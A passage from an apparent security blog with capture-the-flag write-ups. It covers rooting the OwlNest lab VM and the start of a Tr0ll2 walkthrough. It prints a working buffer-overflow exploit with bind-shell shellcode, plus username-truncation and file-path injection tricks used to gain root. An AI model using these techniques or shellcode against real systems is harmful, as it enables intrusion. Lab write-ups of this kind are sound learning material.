Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10
Network Distance: 1 hop</p>

<p>OS detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
root@pwk:/var/www#
[/plain]</p>

<p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:/var/www# nc -nv 172.16.56.131 31337
nc: 172.16.56.131 31337 open
        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>

<p>This is the OwlNest Administration console</p>

<p>Type Help for a list of available commands.</p>

<p>Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
Ready: help</p>

<p>Syntax: command <argument></p>

<p>help         This help
username     Specify your login name
password     Specify your password
privs    Specify your access level
login        login to shell with specified username and password</p>

<p>Ready:
[/plain]</p>

<p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png" alt="owlnest_001" /></a></p>

<p>The Register link allows us to create a new user, which we can use to log in and look around</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png" alt="owlnest_002" /></a></p>

<p>But it seems we&rsquo;re not allowed to use the Upload feature, because we&rsquo;re not &ldquo;admin&rdquo;. An interesting point to note here is that the URL for the Upload feature is <a href="http://172.16.56.131/uploadform.php?page=forms/form.php,">http://172.16.56.131/uploadform.php?page=forms/form.php,</a> which means we could possibly leverage it for LFI. No other links on the site work in this way.</p>

<p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>

<p>[html]</p>

<div class="form-group">
                <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
                <div class="col-sm-5 col-lg-5">
                    <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
                </div>
            </div>


<p>[/html]</p>

<p>Could we cheat the system and register a user with the name &ldquo;admin&rdquo; and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of &ldquo;admin&rdquo; and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to &ldquo;admin           a&rdquo; and submitted.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png" alt="owlnest_003" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png" alt="owlnest_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png" alt="owlnest_005" /></a></p>

<p>Once this malicious user is created, it is possible to then log in with the username of &ldquo;admin&rdquo; and the password we set for &ldquo;admin           a&rdquo;.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png" alt="owlnest_006" /></a></p>

<p>Which allows access to the Upload feature (not that we&rsquo;re going to use it for it&rsquo;s intended use)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png" alt="owlnest_007" /></a></p>

<hr />

<h2>This is a Hoot !</h2>

<p>The upload form posts to /application/upload</p>

<p>[html]
<form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
[/html]</p>

<p>Which when called with no arguments shows the following</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png" alt="owlnest_008" /></a></p>

<p>It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png" alt="owlnest_009" /></a></p>

<h2>Owls Well That Ends Well</h2>

<p>The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png" alt="owlnest_010" /></a></p>

<p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#109;&#101;&#64;&#x6d;&#101;&#46;&#99;&#x6f;&#x6d;">&#109;&#x65;&#64;&#x6d;&#101;&#46;&#99;&#x6f;&#109;</a>&rdquo;
root@pwk:~# ./owlbin
Content-type: text/plain</p>

<p>Unable to open file
root@pwk:~#
[/plain]</p>

<p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;BBBB&rdquo;&rsquo;)
root@pwk:~# ./owlbin
Content-type: text/plain</p>

<p>Segmentation fault
root@pwk:~#
[/plain]</p>

<p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# export QUERY_STRING=$(python -c &lsquo;print &ldquo;uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@&rdquo; + &ldquo;A&rdquo;*276+&ldquo;\xab\x75\x0c\x08&rdquo; + &ldquo;\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&rdquo;&rsquo;)
root@pwk:~# curl -v &ldquo;<a href="http://172.16.56.140/application/upload">http://172.16.56.140/application/upload</a>&rdquo; &ndash;data &ldquo;$QUERY_STRING&rdquo;
* About to connect() to 172.16.56.140 port 80 (#0)
*   Trying 172.16.56.140&hellip;
* connected
* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)</p>

<blockquote><p>POST /application/upload HTTP/1.1
User-Agent: curl/7.26.0
Host: 172.16.56.140
Accept: <em>/</em>
Content-Length: 436
Content-Type: application/x-www-form-urlencoded</p>

<ul>
<li>upload completely sent off: 436 out of 436 bytes
root@pwk:~# nc -nv 172.16.56.140 1337
nc: 172.16.56.140 1337 open
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
[/plain]</li>
</ul>
</blockquote>

<p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x72;&#109;&#112;&#64;&#49;&#55;&#50;&#46;&#49;&#x36;&#46;&#53;&#x36;&#46;&#49;&#x33;&#x31;">&#114;&#109;&#x70;&#64;&#x31;&#55;&#50;&#46;&#x31;&#x36;&#46;&#x35;&#54;&#46;&#x31;&#51;&#49;</a>
The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;172.16.56.131&rsquo; (RSA) to the list of known hosts.
Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
rmp@owlnest:~$ id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rmp@owlnest:~$
[/plain]</p>

<p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>

<p>[plain gutter=&ldquo;false&rdquo;]
rmp@owlnest:~$ ls -l
total 588
-rwx&mdash;&mdash; 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$
[/plain]</p>

<p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# strace ./adminconsole
execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
brk(0)                                  = 0x9407000
brk(0x9407cd0)                          = 0x9407cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x9428cd0)                          = 0x9428cd0
brk(0x9429000)                          = 0x9429000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
) = 67
write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
) = 67
write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
) = 68
write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
) = 70
write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>

<p>) = 69
write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>

<p>) = 46
write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>

<p>) = 47
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&ldquo;privs AAAAAAAAAAAAAAAAAAAAAAAAAA&rdquo;&hellip;, 1024) = 96
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password hello
&ldquo;password hello\n&rdquo;, 1024)       = 15
open(&ldquo;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb775c000, 4096)                = 0
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, ^C <unfinished ...>
root@pwk:~# [/plain]</p>

<p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# strace ./adminconsole
execve(&ldquo;./adminconsole&rdquo;, [&ldquo;./adminconsole&rdquo;], [/<em> 19 vars </em>/]) = 0
uname({sys=&ldquo;Linux&rdquo;, node=&ldquo;pwk&rdquo;, &hellip;})   = 0
brk(0)                                  = 0x84b0000
brk(0x84b0cd0)                          = 0x84b0cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x84d1cd0)                          = 0x84d1cd0
brk(0x84d2000)                          = 0x84d2000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
write(1, &ldquo;        (\<strong><em>/)   (\</em></strong>/)   (\<strong>&rdquo;&hellip;, 67        (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)
) = 67
write(1, &ldquo;        /0\ /0\   /o\ /o\   /0\ &rdquo;&hellip;, 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, &ldquo;        \</strong>V<strong>/   \</strong>V<strong>/   \</strong>V&rdquo;&hellip;, 67        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
) = 67
write(1, &ldquo;       /|:. .:|\ /|;, ,;|\ /|:. &rdquo;&hellip;, 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, &ldquo;       &#92;:::::// &#92;;;;;;// &#92;:::&rdquo;&hellip;, 68       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
) = 68
write(1, &ldquo;   &mdash;&ndash;<code>\"\" \"\"</code>&mdash;<code>\"\" \"\"</code>&mdash;<code>\"\" "..., 70   -----</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;<code>---</code>&rdquo;&ldquo; &rdquo;&ldquo;`&mdash;
) = 70
write(1, &rdquo;        \<strong>V</strong>/   \<strong>V</strong>/   \<strong>V&#8221;&hellip;, 69        __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V__/</p>

<p>) = 69
write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>

<p>) = 46
write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>

<p>) = 47
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs /home/meh/password.txt
&ldquo;privs /home/meh/password.txt\n&rdquo;, 1024) = 29
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password arse
&ldquo;password arse\n&rdquo;, 1024)        = 14
open(&ldquo;rd.txt&rdquo;, O_RDONLY)                = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;blah\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
[/plain]</p>

<p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, username root
&ldquo;username root\n&rdquo;, 1024)        = 14
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
&ldquo;privs AAAAAAAAAAAAAAAA/home/meh/&rdquo;&hellip;, 1024) = 45
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0, password bleh
&ldquo;password bleh\n&rdquo;, 1024)        = 14
open(&ldquo;/home/meh/password.txt&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
<em>llseek(3, 0, [0], SEEK_SET)            = 0
read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
</em>llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
read(0,
[/plain]</p>

<p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nc 172.16.56.140 31337
        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>

<p>This is the OwlNest Administration console</p>

<p>Type Help for a list of available commands.</p>

<p>Ready: username root
Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
Ready: password password
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
               \ <code>-._......_.-</code> /
                <code>.  '.    .'  .'    Oh Well, in the end you did it!
                 //  _</code>\/<code>_  \\     You stopped the olws' evil plan
                ||  /\O||O/\  ||    By pwning their secret base you
                |\  \_/||\_/  /|    saved the world!
                \ '.   \/   .' /
                / ^</code>&lsquo;~  ~&rsquo;`   \
               /  <em>-^</em>~ -^<em> ~-  |
               | / ^</em> -^<em>- ~</em>^\ |
               | |~<em> ^- </em>-^<em> -| |
               | \  ^-~</em> ~-<em>^ / |
               _/;-.,</em><em><em><em>,.-;_/
        ==========(</em>(</em>(==)</em>)_)=========</p>

<p>The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4</p>

<p>Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don&rsquo;t forget to ping me on twitter with your thoughts</p>

<p>Sincerely
@Swappage</p>

<p>PS: why the owls? oh well, I really don&rsquo;t know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
[/plain]</p>

<p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Please do not feed the trolls.]]></title>
    <link href="http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls/"/>
    <updated>2014-10-26T14:36:45+00:00</updated>
    <id>http://recrudesce.github.io/blog/2014/10/26/please-do-not-feed-the-trolls</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>

<p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>

<!-- more -->


<p><img src="http://www.zerodayclothing.com/products/designs/trinity_design.png" alt="" /></p>

<p>And so should you.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# nmap -sS -T5 -p- &ndash;script banner 172.16.56.138</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-23 15:27 BST
Nmap scan report for 172.16.56.138
Host is up (0.00020s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
|<em>banner: 220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
22/tcp open  ssh
|</em>banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
80/tcp open  http
MAC Address: 00:0C:29:14:2B:52 (VMware)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
root@pwk:~#
[/plain]</p>

<p>FTP, SSH and HTTP. Lets hit the HTTP server first, as that&rsquo;s where Tr0ll started.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png" alt="tr0ll2_001" /></a></p>

<p>So, the usual then. A quick Nikto scan shows that there&rsquo;s a robots.txt file, which has the following in it</p>

<p>[plain]
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
[/plain]</p>

<p>Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
root@pwk:~# dirb <a href="http://172.16.56.138">http://172.16.56.138</a> troll_url.txt</p>

<hr />

<p>DIRB v2.21</p>

<h2>By The Dark Raver</h2>

<p>START_TIME: Thu Oct 23 15:31:32 2014
URL_BASE: <a href="http://172.16.56.138/">http://172.16.56.138/</a>
WORDLIST_FILES: troll_url.txt</p>

<hr />

<p>GENERATED WORDS: 21</p>

<p>&mdash;- Scanning URL: <a href="http://172.16.56.138/">http://172.16.56.138/</a> &mdash;-
==> DIRECTORY: <a href="http://172.16.56.138/noob/">http://172.16.56.138/noob/</a>
==> DIRECTORY: <a href="http://172.16.56.138/keep_trying/">http://172.16.56.138/keep_trying/</a>
==> DIRECTORY: <a href="http://172.16.56.138/dont_bother/">http://172.16.56.138/dont_bother/</a>
==> DIRECTORY: <a href="http://172.16.56.138/ok_this_is_it/">http://172.16.56.138/ok_this_is_it/</a></p>

<p>&mdash;- Entering directory: <a href="http://172.16.56.138/noob/">http://172.16.56.138/noob/</a> &mdash;-</p>

<p>&mdash;- Entering directory: <a href="http://172.16.56.138/keep_trying/">http://172.16.56.138/keep_trying/</a> &mdash;-</p>

<p>&mdash;- Entering directory: <a href="http://172.16.56.138/dont_bother/">http://172.16.56.138/dont_bother/</a> &mdash;-</p>

<p>&mdash;- Entering directory: <a href="http://172.16.56.138/ok_this_is_it/">http://172.16.56.138/ok_this_is_it/</a> &mdash;-</p>

<hr />

<p>DOWNLOADED: 105 - FOUND: 0
root@pwk:~/troll#
[/plain]</p>

<p>Visiting these URL&rsquo;s provide the following page
<a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png" alt="tr0ll2_002" /></a></p>

<p>While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
-rw-r&ndash;r&ndash; 1 root root   15831 Oct  4 09:57 cat_the_troll.jpg
-rw-r&ndash;r&ndash; 1 root root   15873 Oct  4 09:31 cat_the_troll.jpg.1
[/plain]</p>

<p>Running strings (NOOOO !!!!) on this file results in the following output</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Look Deep within y0ur_self for the answer
root@pwk:~#
[/plain]</p>

<p>Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
On visual inspection, one line stands out&hellip; (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)</p>

<p>[plain]
SXNzYWNoYXIK
SXN0YW5idWwK
SXN0YW5idWwK
SXN1enUK
SXN1enUK
SXQK
SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
SXRhaXB1Cg==
SXRhaXB1Cg==
SXRhbGlhbgo=
SXRhbGlhbgo=
SXRhbGlhbnMK
SXRhbHkK
[/plain]</p>

<p>Decoded, we get</p>

